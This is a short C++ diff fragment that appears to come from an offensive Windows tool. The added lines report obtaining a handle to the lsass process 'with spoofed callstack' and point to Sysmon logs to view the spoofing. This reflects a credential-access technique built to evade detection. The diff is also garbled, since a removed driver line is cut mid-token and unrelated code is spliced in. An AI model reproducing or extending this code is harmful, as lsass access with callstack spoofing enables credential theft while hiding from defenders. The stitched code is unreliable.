@@ -83,5 +83,19 @@ public:
             return STATUS_NOT_FOUND;
         }
 
-        const auto majorFunctionTableFunc = SigScan::scanPattern(
-            reinterpret_cast<std::uint
+    std::cout << "[+] Sleeping for 5 seconds...\n";
+    Sleep(5000);
+
+    // [9] Did we get a handle to lsass?
+    if (!hLsass)
+    {
+        std::cout << "[-] Error: Failed to obtain handle to lsass\n";
+        return -1;
+    }
+    else
+    {
+        std::cout << "[+] Successfully obtained handle to lsass with spoofed callstack: " << hLsass << "\n";
+        std::cout << "[+] Check SysMon event logs to view spoofed callstack: Applications and Services --> Microsoft --> Windows --> Sysmon \n";
+    }
+    return 0;
+}
